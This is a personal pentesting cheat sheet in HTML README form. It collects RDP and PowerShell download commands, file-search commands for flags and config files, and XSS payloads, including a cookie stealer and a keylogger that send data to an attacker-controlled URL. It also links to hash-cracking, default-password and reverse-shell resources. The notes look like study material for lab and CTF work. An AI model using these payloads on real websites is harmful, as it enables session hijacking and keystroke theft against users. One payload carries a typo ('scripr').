 <h1 align='center'> Penetration time</h1>

<h1>My pentesting cheat sheet, where I share "hotkey" tools and the same things.</h1>
There is a :
<ol>
	<li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/network_tools'>network tools</a>
  	<li> <a href='#n1'>command examples</a>
  	<li> <a href='#n2'>payloads</a>
  	<li> <a href='#n3'>helpful sites</a>
	<li> <a href='#n4'>tools</a>
	<!--<li> cheat sheet injections
  	<li> shells!-->
</ol>

<h2 align='center' id='n1'><em>Commands</em></h2> 
<h3>Remote Desktop Protocol (rdp)</h3>
  <code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;MACHINE_IP> /u:&lt;User> /p:&lt;'Password'></code>
  <p><code>xfreerdp /v:&lt;IP> /u:&lt;Username> /p:&lt;Password> +clipboard<></code>
	
<h3>To get stable shell from unstable from PowerShell</h3>
  <code>powershell -c "Invoke-WebRequest -Uri 'http://&lt;IP>:&lt;PORT>/&lt;filename>' -OutFile 'C:\Windows\Temp\&lt;filename>'"</code>
  
<h3>Commands to find in:</h3>
<h4>Linux</h4>
	<p> <code>find / -type f</code> - Find all files in / directory
	<p> <code>find / -type f | grep 'flag'</code> - Find all files with 'flag' in file name
	<p> <code>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null</code> - Find all path files with ‘config’ 

<h2 align='center' id='n2'><em>Payloads</em></h2>
    <h3>XSS Payloads</h3>
    <li> <b>Proof Of Concept (PoC)</b> - <code><script>alert('Success XSS!');</script></code>
      <p>This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
    <li> <b>Session Srealing</b> - <code><script>fetch('url/steal?cookie=' + btoa(document.cookie));</script></code>
      <p>Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
    <li> <b>Key Logger</b> - <code><scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script></code>
      <p>The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
    <li> <b>Business Logic</b> - <code><script>user.changeEmail('your@email.com');</script></code>
      <p>This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
    <li><b>Polyglots</b> - <code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e</code>
      <p>An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
	      
        
<h2 align='center' id='n3'><em>Sites</em></h2>
      <li> <a href='https://crackstation.net/'>crackstation.net</a> - online password hash cracker
      <li> <a href='https://www.base64encode.org/'>Base64</a> encode/decode
      <li> <a href='https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'>Reverse Shell Cheat Sheet</a>
      <li> <a href='https://hashes.com/en/tools/hash_identifier'>Identify hash types</a>
      <li> <a href='https://devhints.io/bash'>Bash scripting</a> cheat sheet
      <li> <a href='https://gchq.github.io/CyberChef/'>CyberChef</a> - encode/decode service
      <li> <a href='https://www.kirsle.net/wizards/flask-session.cgi'>Flask Session Cookie Decoder</a>
      <li> <a href='https://viewdns.info/'>ViewDNS</a> Offers reverse IP Lookup. OSINT tool. 
      <li> <a href='https://www.shodan.io/'>ViewDNS</a> is the world's first search engine for Internet-connected devices. OSINT tool.
      <li> <a href='https://search.censys.io/'>Censys Search</a> Can provide a lot of information about IP addresses and domains. OSINT tool.
      <li> <a href='https://cirt.net/passwords'>CIRT.net</a> Dafault Passwords service
      <li> <a href='https://default-password.info/'>Default-Password.info</a> Dafault Passwords service
      <li> <a href='https://datarecovery.com/rd/default-passwords/'>Datarecovery.com</a> Dafault Passwords service
      <li> <a href='https://wiki.skullsecurity.org/index.php?title=Passwords'>This</a> wiki page includes the most well-known collections of passwords.
	      
        
<h2 align='center' id='n4'><em>Tools</em></h2>
	<ol>
		<li><h3><a href='https://www.kali.org/tools/ncurses-hexedit/'>Hexeditor</a></h3>
	        	<p> Tools for change files signature. <a href='https://en.wikipedia.org/wiki/List_of_file_signatures'>Link</a> to Wiki with List of file signatures. 
		<li><h3><a href='https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master'>Tool</a> for hash identification.</h3> 
			<p> Python file. Very useful.
		<li><h3><a href='https://www.kali.org/tools/crunch/'>Crunch</a></h3>
		   <p> This is one of many powerful tools for creating an offline wordlist. With crunch, you can specify numerous options, including min, max, and options. The following example creates a wordlist containing all possible combinations of 3 characters, including 1-5 and qwerty. You can use the -o argument to save. <p>Example: <code>crunch 3 3 12345qwerty -o cranch.txt</code>.
		<li><h3><a href='https://github.com/therodri2/username_generator'>Username generator</h3>
			<p>Could help create a list with most of the possible combinations if we have a first name and last name. Use git clone and <p><code>python3 username_generator.py -h</code> shows the tool's help message and optional arguments.
	</ol>
